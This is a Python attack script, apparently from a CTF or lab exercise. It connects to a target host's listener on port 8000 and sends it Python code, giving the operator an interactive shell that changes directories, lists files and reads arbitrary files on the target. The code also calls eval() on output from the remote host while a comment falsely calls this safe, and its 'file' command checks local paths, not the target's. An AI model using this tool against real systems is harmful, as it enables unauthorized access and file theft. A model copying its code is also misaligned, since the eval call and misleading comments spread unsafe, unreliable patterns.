import os
import socket

# Target machine's IP address and port
host = '10.10.135.161'  # Replace with the target machine's IP
port = 8000  # Port number (must match the target machine's listener)

# Create a socket and connect to the target machine
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host, port))

print(f"Connected to {host}:{port}")
print("Type 'exit' to quit.")

# Initialize the current working directory (start from root or home)
current_directory = '/'

# Loop to interact with the target machine
while True:
    # Prompt the user for input (command)
    command = input(f"PyShell at {current_directory} > ")
    
    # Exit the loop if 'exit' is entered
    if command.lower() == 'exit':
        print("Exiting the shell...")
        break
    
    # Handle the 'cd' command
    elif command.lower().startswith('cd'):
        # Extract the directory path from the 'cd' command
        new_path = command[3:].strip() if len(command) > 2 else '/'
        
        # Validate the directory path
        if new_path == '':
            new_path = '/'
        elif new_path == '..':
            # Go up one directory level
            new_path = os.path.dirname(current_directory)
        elif new_path.startswith('/'):
            # Absolute path, so update the current directory
            new_path = os.path.abspath(new_path)
        else:
            # Relative path
            new_path = os.path.join(current_directory, new_path)
        
        # Check if the path is a valid directory
        # Send the appropriate Python code to change the directory on the target machine
        python_command = f'os.chdir("{new_path}")\n'
        sock.send(python_command.encode('utf-8'))
        
        # Receive the output to verify if the directory change was successful
        output = sock.recv(4096).decode('utf-8').strip()
        
        # If there's no error, update the current directory
        if "Permission denied" in output or "No such file or directory" in output:
            print(f"Error: {output}")  # Print the error message
        else:
            current_directory = new_path
            print(f"Changed directory to: {current_directory}")
    
    # Handle the 'ls' command
    elif command.lower().startswith('ls'):
        # Extract the directory path from the 'ls' command (if provided)
        path = command[3:].strip() if len(command) > 2 else current_directory
        # Send the appropriate Python code to list the directory contents
        python_command = f'print(os.listdir("{path}"))\n'
        sock.send(python_command.encode('utf-8'))
        
        # Receive the output from the target machine
        output = sock.recv(4096).decode('utf-8').strip()
        
        # Check if the output is a permission error or valid list
        if output:
            try:
                # Try to evaluate the output as a list
                output_list = eval(output)  # Safely convert the string back into a list
                print(" ".join(output_list))  # Join the list items with spaces
            except SyntaxError:
                # If eval() fails, just print the output as an error message
                print(f"Error: {output}")  # Print the permission error or other error message
    
    # Handle the 'cat' command to display the content of a file
    elif command.lower().startswith('cat'):
        # Extract the file path from the 'cat' command
        file_path = command[4:].strip()
        
        # Attempt to open and read the file directly
        python_command = f'print(open("{file_path}", "r").read())\n'
        sock.send(python_command.encode('utf-8'))
        
        # Receive the output from the target machine
        output = sock.recv(4096).decode('utf-8').strip()
        
        # Print the file's contents (or any error message)
        if output:
            print(output)
    
    # Handle the 'file' command
    elif command.lower().startswith('file'):
        # If no arguments, list all files in the current directory like 'ls -l'
        if len(command) == 4 or command[5:].strip() == '':
            python_command = f'print([os.stat(os.path.join("{current_directory}", f)).st_mode for f in os.listdir("{current_directory}")])\n'
            sock.send(python_command.encode('utf-8'))
            
            # Receive the output from the target machine
            output = sock.recv(4096).decode('utf-8').strip()
            
            if output:
                try:
                    # Try to evaluate the output as a list of file stats
                    output_list = eval(output)  # Convert to a list of file modes
                    for file_stat in output_list:
                        print(file_stat)  # Print each file's stats, or customize this part
                except SyntaxError:
                    # If eval() fails, just print the error message
                    print(f"Error: {output}")
        else:
            # If an argument is provided, display the type of that file
            file_path = command[5:].strip()
            if os.path.exists(file_path):
                if os.path.isfile(file_path):
                    print(f"{file_path} is a regular file.")
                elif os.path.isdir(file_path):
                    print(f"{file_path} is a directory.")
                else:
                    print(f"{file_path} is a special file.")
            else:
                print(f"{file_path} does not exist.")
    
    else:
        # For any other command, just print the command itself
        print(f"Executing: {command}")

# Close the connection
sock.close()
